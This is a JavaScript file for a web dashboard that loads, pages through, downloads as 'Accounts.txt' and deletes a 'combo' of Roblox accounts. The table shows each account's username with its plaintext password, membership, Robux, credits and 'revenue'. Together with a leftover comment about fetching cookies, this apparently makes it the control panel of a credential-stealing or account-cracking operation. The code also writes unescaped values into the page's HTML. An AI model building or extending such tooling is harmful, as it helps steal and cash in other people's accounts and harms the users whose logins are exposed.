const accountstables = document.getElementById("accountables");

let accountIndex = 0;
const accountsPerPage = 10;

function loadaccounts(accounts) {
    let content = '';
    const endIndex = Math.min(accountIndex + accountsPerPage, accounts.length);
    for (let i = accountIndex; i < endIndex; i++) {
        const account = accounts[i];
        content += `
            <tr>
                <td>${account.rbxusername}</td>
                <td>${account.rbxpassword}</td>
                <td>${account.membership}</td>
                <td>${account.robux}</td>
                <td>${account.credits}</td>
                <td>${account.revenue}</td>
            </tr>
        `;
    }
    accountstables.innerHTML += content;
    accountIndex = endIndex;
}

function fetchAccounts() {
    fetch('api/load_combo/loadaccounts')
        .then(response => response.json())
        .then(data => {
            const accounts = data.accounts;
            loadaccounts(accounts);
        })
        .catch(error => console.log(error));
}

// Event listener for scrolling
window.addEventListener('scroll', () => {
    const { scrollTop, scrollHeight, clientHeight } = document.documentElement;
    if (scrollTop + clientHeight >= scrollHeight) {
        // Reached the bottom of the page, fetch and load the next set of accounts
        fetchAccounts();
    }
});

function downloadaccounts() {
    fetch('/api/load_combo/downloadaccounts')
        .then(response => response.blob())
        .then(blob => {
            const downloadUrl = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = downloadUrl;
            a.download = 'Accounts.txt';
            a.click();
            URL.revokeObjectURL(downloadUrl);
        })
        .catch(error => {
            console.error('Error downloading file:', error);
        });

}

function deleteaccounts(){

    swal({
        title: 'Delete Accounts',
        text: 'Are you sure you want to delete this Accounts?',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#d33',
        cancelButtonColor: '#3085d6',
        confirmButtonText: 'Yes, delete it!',
        cancelButtonText: 'Cancel'
    }).then(result => {
        if(result) {
            // Remove the game card from the DOM first
            // Make the API call to delete the game
            fetch(`/api/load_combo/deleteaccounts`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({})
            }).then(response => {
                if(response.ok) {
                    accountstables.innerHTML = "";
                    swal('Success', 'Acccounts Combo Deleted', 'success');
                } else {
                    // Handle delete error
                    console.error('Failed to delete accounts');
                }
            }).catch(error => {
                console.error(error);
                // Handle delete error
            });
        }
    });


}


// Call the fetchCookies function when the page is loaded
document.addEventListener('DOMContentLoaded', fetchAccounts);